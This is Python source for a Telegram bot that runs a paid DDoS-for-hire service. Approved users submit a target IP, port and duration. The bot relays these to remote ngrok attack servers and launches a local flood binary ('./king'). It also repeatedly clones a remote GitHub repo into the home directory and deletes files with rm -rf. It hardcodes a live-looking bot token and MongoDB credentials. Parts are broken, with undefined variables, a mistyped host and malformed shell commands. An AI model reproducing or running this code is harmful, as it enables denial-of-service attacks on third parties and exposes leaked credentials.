import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop() 
TOKEN = '7530415462:AAEjRIWWBJBmcNerEpz1ZIcrtACf8EHFj0A'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002302588770
CHANNEL_ID = -1002302588770
error_channel_id = -1002302588770

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]


def monitor_txt_file_updates():
    """Periodically check for updates to all `soul.txt` files."""
    last_contents = [None] * len(GITHUB_FILE_URLS)

    while True:
        for idx, (github_url, local_file) in enumerate(zip(GITHUB_FILE_URLS, LOCAL_FILES)):
            try:
                response = requests.get(github_url)
                if response.status_code == 200:
                    current_content = response.text.strip()
                    if current_content != last_contents[idx]:
                        with open(local_file, "w") as file:
                            file.write(current_content)
                        last_contents[idx] = current_content
                        file_urls = current_content.splitlines()[:5]
                        urls.extend(file_urls)
                        logging.info(f"Updated {local_file} with {len(file_urls)} URLs.")
                    else:
                        logging.info(f"No changes detected in {local_file}.")
                else:
                    logging.error(f"Failed to fetch {github_url}. Status code: {response.status_code}")
            except Exception as e:
                logging.error(f"Error monitoring {github_url}: {e}")

        time.sleep(CHECK_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    files = ["jony.txt", "jony1.txt","jony2.txt","jony3.txt","jony4.txt","jony5.txt"]
    
    for current_file in files:
        try:
            with open(current_file, "r") as file:
                ngrok_url = file.read().strip()
                
            url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}"
            headers = {"ngrok-skip-browser-warning": "any_value"}
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                logging.info(f"Attack command sent successfully: {url}")
                logging.info(f"Response: {response.json()}")
            else:
                logging.error(f"Failed to send attack command. Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")

            os.system(f"./king {target_ip} {target_port} {duration} 900")

        except Exception as e:
            logging.error(f"Failed to execute command with {current_file}: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)


def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False


def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*🚫 YOU ARE NOT APPROVED 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n👉 Contact an Admin or the Owner for approval*", parse_mode='Markdown')


@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()
    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*✅ User {target_user_id} approved for {plan} days *"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')


@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Please provide the details for the attack in the following format:\n\n<ip> <port> <time>*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")


def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid Format\n\nUse <IP> <PORT> <TIME>*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack Sent Successfully! 🚀\n\nTarget: {target_ip}:{target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")


def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False


def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())


def manage_github_repo():
    while True:
        time.sleep(60)
        os.system('git clone https://github.com/soulranaka70/soul.git')
        os.system('cd soul && mv * $HOME')
        
        time.sleep(1800) 
        os.system('rm -rf soul')
        os.system('rm soul.txt & rm soul2.txt & rm shivam.txt & rm soul3.txt & & rm soul4.txt & & rm soul5.txt')
        os.system('git clone https://sgithub.com/soulranaka70/soul.git')
        os.system('cd soul && mv * $HOME')
        
        time.sleep(1800) 
        os.system('rm -rf soul')
        os.system('rm soul.txt & rm soul2.txt & rm shivam.txt & rm soul3.txt & & rm soul4.txt & & rm soul5.txt')
        os.system('git clone https://sgithub.com/soulranaka70/soul.git')
        os.system('cd soul && mv * $HOME')

        time.sleep(1800) 
        os.system('rm -rf soul')  
        os.system('rm soul.txt & rm soul2.txt & rm shivam.txt & rm soul3.txt & & rm soul4.txt & & rm soul5.txt')
        os.system('git clone https://sgithub.com/soulranaka70/soul.git')
        os.system('cd soul && mv * $HOME')
        time.sleep(1800) 
        os.system('rm -rf soul')
       
        os.system('rm soul.txt & rm soul2.txt * rm shivam.txt')
        os.system('git clone https://sgithub.com/soulranaka70/soul.git')
        os.system('cd soul && mv * $HOME')
        time.sleep(1800) 
        os.system('rm -rf soul')
        os.system('rm soul.txt & rm soul2.txt & rm shivam.txt & rm soul3.txt & & rm soul4.txt & & rm soul5.txt')
        os.system('git clone https://sgithub.com/soulranaka70/soul.git')
        os.system('cd soul && mv * $HOME')
if __name__ == "__main__":
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    logging.info("Starting the bot...")
    
    file_monitor_thread = Thread(target=monitor_txt_file_updates, daemon=True)
    file_monitor_thread.start()

    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()

    github_repo_thread = Thread(target=manage_github_repo, daemon=True)
    github_repo_thread.start()

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred in bot polling: {e}")
